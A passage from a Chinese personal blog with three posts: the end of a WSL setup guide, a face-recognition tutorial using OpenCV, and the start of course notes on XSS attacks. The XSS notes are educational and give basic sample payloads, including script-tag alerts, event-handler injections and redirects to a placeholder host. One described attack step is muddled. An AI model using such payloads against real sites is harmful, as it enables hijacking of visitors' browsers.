<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxrunoffline su -n &lt;WSL名称&gt; -v 0</span><br></pre></td></tr></table></figure>
<p>设置默认用户为 <code>root</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201228215451721.png" alt="设置默认用户 root"></p>
<h4 id="2-3-3-2-设置普通用户为默认用户"><a href="#2-3-3-2-设置普通用户为默认用户" class="headerlink" title="2.3.3.2 设置普通用户为默认用户"></a>2.3.3.2 设置普通用户为默认用户</h4><p>使用 <code>lxrunoffline</code> 新安装的 <code>WSL</code> 默认是以 <code>root</code> 用户登录，如果你需要默认以普通用户进行登录，就需要进行下面的操作。</p>
<p>首先运行 <code>WSL </code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxrunoffline r -n &lt;WSL名称&gt;</span><br></pre></td></tr></table></figure>
<p>输入以下命令创建用户：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd -m -s &#x2F;bin&#x2F;bash &lt;用户名&gt;</span><br></pre></td></tr></table></figure>
<p>然后对该用户设置密码，输入命令后会提示输入两次密码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd &lt;用户名&gt;</span><br></pre></td></tr></table></figure>
<p>授予该用户 <code>sudo</code> 权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usermod -aG sudo &lt;用户名&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>为了保持和微软商店安装的效果一致，这里提及的方法是把用户添加到 sudo 用户组。其他关于 sudo 权限的设置方法以及免密设置可参考《<a target="_blank" rel="noopener" href="https://p3terx.com/archives/linux-grants-normal-user-sudo-permission.html">Linux 中授予普通用户 sudo 权限的正确方法</a>》这篇文章。</p>
</blockquote>
<p>查看用户 UID ，一般是 <code>1000</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id -u &lt;用户名&gt;</span><br></pre></td></tr></table></figure>
<p>按 <code>Ctrl</code>+<code>D</code> 退出 <code>WSL</code> ，在 <code>Pow­er­Shell</code> 中输入以下命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxrunoffline su -n &lt;WSL名称&gt; -v 1000</span><br></pre></td></tr></table></figure>
<br>

<h2 id="2-4-进入验证"><a href="#2-4-进入验证" class="headerlink" title="2.4 进入验证"></a>2.4 进入验证</h2><p>通过下面命令，可以启动一个指定的发行版</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxrunoffline r -n &lt;WSL名称&gt;</span><br></pre></td></tr></table></figure>
<p>然后一瞬进入，由于笔者设置了就是管理员root，所以不用sudo。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201229133649835.png" alt="测试"></p>
<p>于是到这里 <code>WSL</code> 就安装完毕啦，你可以拿去玩好玩的了。</p>
<br>

<h2 id="2-5-桌面安装"><a href="#2-5-桌面安装" class="headerlink" title="2.5 桌面安装"></a>2.5 桌面安装</h2><p>根据参考的教程，还可以在 <code>WSL</code> 中安装远程桌面，通过 Windows 的远程桌面进行连接，Windows 不需要再安装其他东西。还是挺香的。</p>
<p>使用了xrdp+xface4，参考链接为：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Lz4y1975a">here</a>。</p>
<p>笔者暂时没有这个需求，就没有整。</p>
<br>

<h1 id="0x03-遇到的坑"><a href="#0x03-遇到的坑" class="headerlink" title="0x03 遇到的坑"></a>0x03 遇到的坑</h1><p>使用此方法搭建可能会遇到一个坑：lxrunoffline 可能没认识 <code>WSL2</code> 所以设置的 <code>WSL2</code> 默认版本可能就没有生效，按照的版本就是 <code>WSL1</code> 的，所以如果某些要求2的版本（如对 <code>CUDA</code> 的支持）则需要先将其升级为 <code>WSL2</code> 的才可以。</p>
<p>这里部分请参考另外一篇。</p>
<br>

<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>东西确实不错，比虚拟机启动快，随时可以切换，文件系统和Windows共享，可以随便迁移，也可以开启桌面通过远程桌面进行连接，可以保存快照，<code>WSL2</code> 还可以使用 <code>CUDA</code> 了。我想除了某些神奇病毒的研究需要使用虚拟机以进行隔离意外，我暂时想不到不用 <code>WSL</code> 的地方了。</p>
<p>总之，我局的很不错。</p>
<br>

<h1 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h1><p>lxrunoffline+wsl: <a target="_blank" rel="noopener" href="https://p3terx.com/archives/manage-wsl-with-lxrunoffline.html">https://p3terx.com/archives/manage-wsl-with-lxrunoffline.html</a></p>
<p>wsl2 官方教程: <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/wsl/install-win10">https://docs.microsoft.com/en-us/windows/wsl/install-win10</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://lucxer.tk/2020/12/28/WSL2%E5%AE%89%E8%A3%85/" data-id="ckja3vkpi000114lnb4e78sh1" data-title="Windows 使用 lxrunoffline 安装 WSL、WSL2" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WSL/" rel="tag">WSL</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WSL2/" rel="tag">WSL2</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Windows/" rel="tag">Windows</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%85%8D%E7%BD%AE/" rel="tag">配置</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-ubuntu_opencv_face_reconginition" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/11/27/ubuntu_opencv_face_reconginition/" class="article-date">
  <time class="dt-published" datetime="2020-11-27T03:24:13.000Z" itemprop="datePublished">2020-11-27</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/">深度学习</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/11/27/ubuntu_opencv_face_reconginition/">opcv + face_recognition 实现人脸实时识别</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="0x01-写在前面"><a href="#0x01-写在前面" class="headerlink" title="0x01 写在前面"></a>0x01 写在前面</h1><p>本学期有一门专业选修课《大数据分析与隐私保护》，期末需要完成一个小组项目，也不是很复杂就是想让我们玩玩神经网络啊，深度学习啊啥的。</p>
<p>于是和小组成员<a target="_blank" rel="noopener" href="https://hiram.wang/">Hiram</a>和<a target="_blank" rel="noopener" href="https://drivertom.blogspot.com/">driveTom</a>简单讨论了几个想法之后，遂决定把想法都试试，看看可行性。</p>
<p>于是我搜集资料的过程中找到了大佬们的库<a target="_blank" rel="noopener" href="https://github.com/ageitgey/face_recognition">face_recognition</a>，测试了下效果局得还不错。于是便和成员决定试试看。</p>
<h1 id="0x02-安装-face-recognition"><a href="#0x02-安装-face-recognition" class="headerlink" title="0x02 安装 face_recognition"></a>0x02 安装 face_recognition</h1><p>大概浏览了网上的教程，似乎都说得挺难的。我就怀着忐忑的信息试了试。（最开始是在百度的 <a target="_blank" rel="noopener" href="https://aistudio.baidu.com/aistudio/index">aistudio</a> 上试的，<del>感谢百度</del>。 </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install face_recognition</span><br></pre></td></tr></table></figure>
<p>虽然过程慢的一批，但是还是一瞬成功了。而后面的使用也是成功的，说明确实是一瞬成功了。</p>
<p>然后看网上说的，这个是有很多C语言整的，可能比较麻烦。我尝试在我的 <code>Windows 10</code> 上进行安装，果不其然出错了。说是缺少 <code>cmake</code> 。想着 <code>Windows</code> 上整这玩意比较麻烦，于是我就想转到我的 <code>Ubuntu</code> 虚拟机中试试。于是有了后文。</p>
<p>Ubuntu 中首先安装一下 <code>cmake</code> 如果没有的话</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install cmake</span><br></pre></td></tr></table></figure>
<p>然后再执行前面的 <code>pip</code> 命令就好了</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install face_recognition</span><br></pre></td></tr></table></figure>
<p>虽然过程还是比较慢，但是还是可以一瞬成功，并且可以用。</p>
<h1 id="0x03-简单使用"><a href="#0x03-简单使用" class="headerlink" title="0x03 简单使用"></a>0x03 简单使用</h1><p>从<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/77678302">知乎</a>那里剽窃到了使用教程。只需要<strong>6行</strong>就可以简单使用起来。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入库</span></span><br><span class="line"><span class="keyword">import</span> face_recognition</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取第一张图片</span></span><br><span class="line">pic1 = face_recognition.load_image_file(<span class="string">&#x27;pic1.jpg&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将第一张图片编码（转化为向量） </span></span><br><span class="line"><span class="comment"># face_encodings 返回的是一个列表，表中元素是识别出来的图片中的脸，若图中有多张脸也可以识别出来</span></span><br><span class="line"><span class="comment"># 这里我们只取了第一张脸</span></span><br><span class="line"><span class="comment"># 如果这里报错了(index out of range)就说明该模型没有识别出来人脸 返回的应该是一个空列表</span></span><br><span class="line">pic1_encode = face_recognition.face_encodings(pic1)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 故技重施 读取第二个图</span></span><br><span class="line">pic2 = face_recognition.load_image_file(<span class="string">&#x27;pic2.jpg&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 故技重施 编码第二个图</span></span><br><span class="line">pic2_encode = face_recognition.face_encodings(pic2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断这两个图中的人是不是同一个</span></span><br><span class="line"><span class="comment"># compare_faces 第一个参数是一个列表，是需要比对的脸，他会返回一个列表表示第二个参数与第一个列表中的每一个脸是否是同一个</span></span><br><span class="line"><span class="comment"># 这里我们只有两张脸 所以第一个参数就自成一个列表，我们也取第一个</span></span><br><span class="line"><span class="comment"># tolerance 越小，要求比较的两个脸也必须越接近才能判断是同一个脸</span></span><br><span class="line"><span class="comment"># 若 results 是 True 则是同一个人，否则就不是同一个人</span></span><br><span class="line"><span class="comment"># 他的原理应该就是计算两个脸的距离，当距离小于 tolerance 时，就判断是同一个人</span></span><br><span class="line">results = face_recognition.compare_faces([pic1_encode], pic2_encode, tolerance=<span class="number">0.5</span>)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
<p>提供两个可以用的胡歌。<del>感谢胡歌提供的图片。</del></p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/huge1.jpg" alt="huge1"></p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/huge2.jpg" alt="huge2"></p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201127194727372.png" alt="usage"></p>
<h1 id="0x04-结合-opencv-玩"><a href="#0x04-结合-opencv-玩" class="headerlink" title="0x04 结合 opencv 玩"></a>0x04 结合 opencv 玩</h1><p>有了上述的代码，我们就可以结合 <code>opencv</code> 打开摄像头开始happy了。</p>
<p>官方提供了一份样例 <a target="_blank" rel="noopener" href="https://github.com/ageitgey/face_recognition/blob/master/examples/facerec_from_webcam_faster.py">demo</a>。</p>
<p>于是下载下来，结合自己的情况简单改改就OK啦。</p>
<p>这里就是坑所在的地方了。</p>
<h2 id="4-1-找不到-cv2"><a href="#4-1-找不到-cv2" class="headerlink" title="4.1 找不到 cv2"></a>4.1 找不到 cv2</h2><p><code>cv2</code> 是代码中导入 <code>opencv</code> ，于是我们可以安装就好了。</p>
<p>首先我们知道 <code>Windows</code> 上我们安装的命令是 <code>pip install opencv-python</code> 可以一瞬成功，但是 <code>Ubuntu</code> 失败了。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Windows 安装 opencv</span></span><br><span class="line">pip install opencv-python</span><br></pre></td></tr></table></figure>
<p>于是查阅资料，发现应该用 <code>sudo apt-get install python-opencv</code> 。好的整一个。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-opencv</span><br></pre></td></tr></table></figure>
<p>一瞬安装成功了，那就走脚本吧！</p>
<p>可是报错还是找不到 <code>cv2</code> 。这是什么情况呢？明明安装成功了。那找不到就只有可能是安装在其他地方了所以找不到。于是不得不怀疑是不是装在 <code>python2</code> 中了，毕竟这双 <code>python</code>  环境有好有坏。用终端的 <code>python2</code> 测试一波，实锤了。</p>
<p>于是，怎么装到 <code>python3</code> 里面去呢？我突发奇想，或许可以试试 <code>sudo apt-get install python3-opencv</code> 。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python3-opencv</span><br></pre></td></tr></table></figure>
<p>于是一瞬成功了。也可以成功运行了。</p>
<h2 id="4-2-打不开摄像头"><a href="#4-2-打不开摄像头" class="headerlink" title="4.2 打不开摄像头"></a>4.2 打不开摄像头</h2><p>程序前面都正常了，可就是这个摄像头弹不出来。单独用 <code>opencv</code> 整一个弹摄像头画面的脚本跑跑，发现也弹不出来，因此是摄像头这里的问题了。</p>
<p>下面的单纯弹摄像头显示高雅美照的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">capture = cv2.VideoCapture(<span class="number">0</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    ret, frame = capture.read()</span><br><span class="line">    frame = cv2.flip(frame,<span class="number">1</span>)   <span class="comment">#镜像操作</span></span><br><span class="line">    cv2.imshow(<span class="string">&#x27;Photo_Detect&#x27;</span>,frame)     <span class="comment">#显示窗口 查看实时图像</span></span><br><span class="line">    key = cv2.waitKey(<span class="number">50</span>)</span><br><span class="line">    <span class="keyword">if</span> key  == <span class="built_in">ord</span>(<span class="string">&#x27;q&#x27;</span>):  <span class="comment">#判断是哪一个键按下</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">cv2.destroyAllWindows()</span><br></pre></td></tr></table></figure>
<p>这个代码用 <code>Windows</code> 跑没有问题，说明代码没问题。</p>
<p>查阅资料重新配置了 VMware 的 <code>usb</code> 来设置摄像头。在 <code>虚拟机</code> -&gt; <code>可移动设备</code> -&gt; <code>摄像头名字</code> (这里因设备而异哈)连接这个摄像头。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201127201053645.png" alt="连接摄像头"></p>
<p>然后在虚拟机的右下角就会有一个小标志表示摄像头。绿色小点点说明虚拟机在使用中，否则点它一下，VMware  会给一个弹窗，确定就好，然后就有绿色小点点了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201127201232876.png" alt="摄像头图标"></p>
<p>然后通过下面的命令查看有没有输出，输出类似于这个样子 <code>/dev/video0</code> 没有就不对。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /dev/video*</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201127202254610.png" alt="显示摄像头"></p>
<p>然后可以用这个工具 <code>cheese</code> 检测摄像头是否正常 ，在终端输入这个命令会弹出来一个摄像头的窗口。</p>
<p>若没有这个命令，可以先安装。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install cheese</span><br></pre></td></tr></table></figure>
<p>正常情况就会弹出一个框，实时的摄像头画面，里面有自己的高雅美照。若是黑的框框就说明它不对。</p>
<p>那我们就从 VMware  的虚拟机设置中，将 <code>usb</code> 的连接设置为 <code>3.*</code> 再断开摄像头重连一下。他会自动挂起虚拟机一下。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201127202023430.png" alt="修改USB到3.x"></p>
<p>然后再用 <code>cheese</code> 试试。就可以一瞬看到自己的高雅美照了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201127202538713.png" alt="cheese看自己高雅美照"></p>
<p>然后再运行脚本，运气好就可以一瞬成功了。运气不好就可能还得改。</p>
<h2 id="4-3-还是不对"><a href="#4-3-还是不对" class="headerlink" title="4.3 还是不对"></a>4.3 还是不对</h2><p>运气不好的朋友还是不对，还有报错。不知道还真以为代码有问题，这个 <code>resize</code> 有问题，实则不是，这个是无问题的。只是他没有正确捕获到图片，还是摄像头连接的问题。我从另一个参考资料里面得到了解释。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201127202705953.png" alt="错误assertion"></p>
<p>还是之前的命令 <code>ls /dev/video*</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /dev/video*</span><br></pre></td></tr></table></figure>
<p>看看返回的结果是啥，我这里刚好有 <code>0</code>，我也不知道为啥有两个。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;dev&#x2F;video0  &#x2F;dev&#x2F;video1</span><br></pre></td></tr></table></figure>
<p>这个时候，代码中获取摄像头的地方就要改变啦。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201127203000095.png" alt="videoCapture"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Get a reference to webcam #0 (the default one)</span><br><span class="line">video_capture &#x3D; cv2.VideoCapture(0)</span><br></pre></td></tr></table></figure>
<p>这个 <code>0</code> 就不是默认了，如果上面 <code>ls /dev/video*</code> 的输出结果中含有 <code>0</code> ，那就还是 <code>0</code> 。不是就得改。</p>
<p>改成啥呢？我也不知道。有一次我的输出结果是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;dev&#x2F;video4  &#x2F;dev&#x2F;video5</span><br></pre></td></tr></table></figure>
<p>我就从 <code>0</code> 一直改到了 <code>4</code> ，然后就可以了，为啥是 <code>4</code> 我也不知道。<del>也不想深究了。。。。。。</del></p>
<h1 id="0x05-结果展示"><a href="#0x05-结果展示" class="headerlink" title="0x05 结果展示"></a>0x05 结果展示</h1><p>然后就可以开心 happy 了。</p>
<p>自我欣赏美照，框出来我是谁，还能框我手机里面的照片是谁。效果还行。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201127203722395.png" alt="结果展示"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>face_recognition： <a target="_blank" rel="noopener" href="https://github.com/ageitgey/face_recognition">https://github.com/ageitgey/face_recognition</a></p>
<p>知乎用法教程： <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/77678302">https://zhuanlan.zhihu.com/p/77678302</a></p>
<p>虚拟机连接物理机摄像头： <a target="_blank" rel="noopener" href="https://blog.csdn.net/u012005313/article/details/82146385">https://blog.csdn.net/u012005313/article/details/82146385</a></p>
<p>选择正确的摄像头： <a target="_blank" rel="noopener" href="https://blog.csdn.net/u011888840/article/details/106146285">https://blog.csdn.net/u011888840/article/details/106146285</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://lucxer.tk/2020/11/27/ubuntu_opencv_face_reconginition/" data-id="ckja3vkq7000w14ln0fdyeluk" data-title="opcv + face_recognition 实现人脸实时识别" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/face-recognition/" rel="tag">face recognition</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/opencv/" rel="tag">opencv</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ubuntu/" rel="tag">ubuntu</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/" rel="tag">人工智能</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BA%BA%E8%84%B8%E8%AF%86%E5%88%AB/" rel="tag">人脸识别</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/" rel="tag">深度学习</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-XSS&amp;SQL" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/11/19/XSS&SQL/" class="article-date">
  <time class="dt-published" datetime="2020-11-19T12:36:29.000Z" itemprop="datePublished">2020-11-19</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%BB%83%E4%B9%A0/">练习</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/11/19/XSS&SQL/">XSS&amp;SQL笔记</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="0x01-写在前面"><a href="#0x01-写在前面" class="headerlink" title="0x01 写在前面"></a>0x01 写在前面</h1><p>本文是对《网络攻防技术》课程关于XSS实验和SQL实验的总结，学习过程使用的是基础的学习网站<a target="_blank" rel="noopener" href="http://test.ctf8.com/">XSS</a>和<a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs">SQLi-labs</a>。</p>
<p>基础入门中……且题目还没有刷完，仅在这里慢慢记录，有空就记录一部分再慢慢更新。</p>
<p><strong>同时，希望读者知道有个东西叫做<a target="_blank" rel="noopener" href="http://www.cac.gov.cn/2016-11/07/c_1119867116.htm">《网络安全法》</a>，请勿在未授权的情况下做任何的尝试。本实验仅在搭建的虚拟环境中实施。</strong></p>
<h1 id="0x02-XSS-攻击"><a href="#0x02-XSS-攻击" class="headerlink" title="0x02 XSS 攻击"></a>0x02 XSS 攻击</h1><h2 id="2-1-XSS-攻击原理"><a href="#2-1-XSS-攻击原理" class="headerlink" title="2.1 XSS 攻击原理"></a>2.1 XSS 攻击原理</h2><h3 id="2-1-1-基本原理"><a href="#2-1-1-基本原理" class="headerlink" title="2.1.1 基本原理"></a>2.1.1 基本原理</h3><p>跨站脚本（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。</p>
<p>XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p>
<h3 id="2-1-2-攻击分类"><a href="#2-1-2-攻击分类" class="headerlink" title="2.1.2 攻击分类"></a>2.1.2 攻击分类</h3><p><strong>按照分类来讲可以分为三大类</strong></p>
<ol>
<li>反射型XSS（非持久型跨站）：反射型跨站脚本漏洞，最普遍的类型。用户访问服务器-跨站链接-返回跨站代码。这类攻击通常使用URL。</li>
<li>存储型XSS（持久型跨站）：最直接的危害类型，跨站代码存储在服务器（数据库）</li>
<li>DOM跨站（DOM XSS）：DOM（document object model文档对象模型），客户端脚本处理逻辑导致的安全问题。</li>
</ol>
<p><strong>区别与联系</strong></p>
<p>反射型 XSS 跟存储型 XSS 的区别是：存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。</p>
<p>反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。</p>
<p>由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。</p>
<p>POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。</p>
<p>DOM 型 XSS 跟另外两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</p>
<h3 id="2-1-3-攻击步骤"><a href="#2-1-3-攻击步骤" class="headerlink" title="2.1.3 攻击步骤"></a>2.1.3 攻击步骤</h3><h4 id="2-1-3-1-反射型XSS"><a href="#2-1-3-1-反射型XSS" class="headerlink" title="2.1.3.1 反射型XSS"></a>2.1.3.1 反射型XSS</h4><ol>
<li><p>攻击者构造出特殊的 URL，其中包含恶意代码。</p>
</li>
<li><p>用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。</p>
</li>
<li><p>恶意页面中的JavaScript打开一个具有漏洞的HTML页面并将其安装在用户电脑上。</p>
</li>
<li><p>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</p>
</li>
<li><p>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</p>
<p> 示例：<br> ①<code>http://xxx/xsstest?key=&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</code><br> ②<code>http://xxx/xsstest?key=&lt;img src=&#39;w.123&#39; onerror=&#39;alert(&quot;XSS&quot;)&#39;&gt;</code><br> ③<code>http://xxx/xsstest?key=&lt;a onclick=&#39;alert(&quot;XSS&quot;)&#39;&gt;点我&lt;/a&gt;</code></p>
</li>
</ol>
<h4 id="2-1-3-2-存储型XSS"><a href="#2-1-3-2-存储型XSS" class="headerlink" title="2.1.3.2 存储型XSS"></a>2.1.3.2 存储型XSS</h4><ol>
<li><p>攻击者构造出特殊的 URL，其中包含恶意代码。</p>
</li>
<li><p>用户打开带有恶意代码的 URL。</p>
</li>
<li><p>用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。</p>
</li>
<li><p>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</p>
<p>示例：</p>
<p>①窃取用户信息，如cookie，token，账号密码等。<br> <code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code><br> ②生成一些恶意图片，文字，用户点击图片或文字，跳转至相应目标网站<br> <code>&lt;img onclick=&quot;window.location.href=&#39;http://xxx.com&#39;&quot; width=&#39;300&#39; src=&#39;img/testxss.jpg&#39;/&gt;</code><br> ③劫持流量实现恶意跳转<br> <code>&lt;script&gt;window.location.href=&quot;http://xxx.com&quot;;&lt;/script&gt;</code></p>
</li>
</ol>
<h4 id="2-1-3-3-DOM型XSS"><a href="#2-1-3-3-DOM型XSS" class="headerlink" title="2.1.3.3 DOM型XSS"></a>2.1.3.3 DOM型XSS</h4><ol>
<li>攻击者构造出特殊的 URL，其中包含恶意代码。</li>
<li>用户打开带有恶意代码的 URL。</li>
<li>用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。</li>
<li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li>
</ol>
<h3 id="2-1-4-攻击方式总结"><a href="#2-1-4-攻击方式总结" class="headerlink" title="2.1.4 攻击方式总结"></a>2.1.4 攻击方式总结</h3><ol>
